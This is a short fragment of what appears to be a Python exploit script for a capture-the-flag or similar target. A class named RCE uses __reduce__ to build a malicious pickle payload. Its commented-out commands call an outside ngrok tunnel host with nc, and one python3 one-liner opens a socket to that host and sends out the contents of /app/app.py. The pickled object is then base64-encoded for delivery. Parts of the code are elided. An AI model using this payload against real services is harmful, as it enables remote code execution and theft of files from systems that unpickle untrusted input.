...
class RCE:
	def __reduce__(self):
		...
		# cmd = ('nc 4.tcp.eu.ngrok.io 18312')
		# cmd = ("python3 -c \"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));s.send(open('/app/app.py','rb').read())\"")
...
# cmd = base64.urlsafe_b64encode(pickled)
